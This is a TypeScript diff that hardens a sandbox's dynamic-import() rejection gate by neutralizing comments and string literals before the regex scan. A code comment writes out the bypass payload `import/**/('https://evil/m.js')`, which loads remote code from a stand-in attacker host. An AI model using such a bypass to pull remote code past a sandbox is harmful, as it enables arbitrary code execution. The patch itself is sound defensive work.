@@ -243,10 +243,124 @@ async function transpileWithBabel(code: string): Promise<TranspileResult> {
 /** The scope-injected module registry a rebound import calls. */
 const IMPORT_REGISTRY = '__stitchImport';
 
+/**
+ * Return a copy of `src` with comment bodies and string/template-literal contents
+ * replaced by same-length blanks, so a keyword scan (the dynamic-`import()` gate)
+ * sees code structure only — never trivia or literal text.
+ *
+ * A single left-to-right pass tracks whether we are inside a line comment, block
+ * comment, or a `'`/`"`/`` ` `` string, and blanks characters accordingly
+ * (newlines are preserved so line/column stay meaningful). This is a lexical
+ * approximation — deliberately conservative: it does NOT parse template
+ * `${…}` substitutions (their contents are blanked too, which is safe for a
+ * reject-only gate) and does NOT try to distinguish a regex literal from
+ * division. That is acceptable because the ONLY consumer is a coarse "is there a
+ * dynamic `import(` anywhere in real code" check; over-blanking a regex body can
+ * at worst hide an `import(` that lived inside a regex literal, which is not
+ * valid dynamic-import syntax anyway.
+ *
+ * Exported for the transpile smoke test (the comment-bypass regression asserts
+ * the neutralizer collapses `import/**\/(` to a detectable `import(`).
+ */
+export function neutralizeCommentsAndStrings(src: string): string {
+    let out = '';
+    let i = 0;
+    const n = src.length;
+    type Mode = 'code' | 'line' | 'block' | 'squote' | 'dquote' | 'template';
+    let mode: Mode = 'code';
+
+    const blank = (ch: string): string => (ch === '\n' ? '\n' : ' ');
+
+    while (i < n) {
+        const ch = src[i];
+        const next = i + 1 < n ? src[i + 1] : '';
+
+        if (mode === 'code') {
+            if (ch === '/' && next === '/') {
+                mode = 'line';
+                out += '  ';
+                i += 2;
+            } else if (ch === '/' && next === '*') {
+                mode = 'block';
+                out += '  ';
+                i += 2;
+            } else if (ch === "'") {
+                mode = 'squote';
+                out += ' ';
+                i += 1;
+            } else if (ch === '"') {
+                mode = 'dquote';
+                out += ' ';
+                i += 1;
+            } else if (ch === '`') {
+                mode = 'template';
+                out += ' ';
+                i += 1;
+            } else {
+                out += ch;
+                i += 1;
+            }
+            continue;
+        }
+
+        if (mode === 'line') {
+            if (ch === '\n') {
+                mode = 'code';
+                out += '\n';
+            } else {
+                out += ' ';
+            }
+            i += 1;
+            continue;
+        }
+
+        if (mode === 'block') {
+            if (ch === '*' && next === '/') {
+                mode = 'code';
+                out += '  ';
+                i += 2;
+            } else {
+                out += blank(ch);
+                i += 1;
+            }
+            continue;
+        }
+
+        // String / template modes: blank contents, honor `\`-escapes, close on the
+        // matching quote (templates also close on backtick — `${}` is blanked too).
+        const quote = mode === 'squote' ? "'" : mode === 'dquote' ? '"' : '`';
+        if (ch === '\\') {
+            // Blank the backslash and the escaped char (keep newlines).
+            out += ' ';
+            if (next) out += blank(next);
+            i += 2;
+            continue;
+        }
+        if (ch === quote) {
+            mode = 'code';
+            out += ' ';
+            i += 1;
+            continue;
+        }
+        out += blank(ch);
+        i += 1;
+    }
+
+    return out;
+}
+
 function rebindModuleImports(js: string): TranspileResult {
     // (1) Reject dynamic import() before the static rewrite strips `import`
     // keywords. `import(` (not a `.import(` member) is always the dynamic form.
-    if (/(^|[^.\w])import\s*\(/.test(js)) {
+    //
+    // We test a COMMENT- and STRING-NEUTRALIZED copy, not the raw `js`. Sucrase
+    // preserves comments, so a bare post-transpile regex with `\s*` between
+    // `import` and `(` is bypassable by wedging a comment in the gap
+    // (`import/**/('https://evil/m.js')` — SEC-31/SEC-04 escape). Neutralizing
+    // comments (and string/template bodies, so an `import(` inside a literal can't
+    // false-positive) makes the gate robust regardless of intervening trivia.
+    const scannable = neutralizeCommentsAndStrings(js);
+    if (/(^|[^.\w])import\s*\(/.test(scannable)) {
         return {
             error: {
                 name: 'UnsupportedImportError',
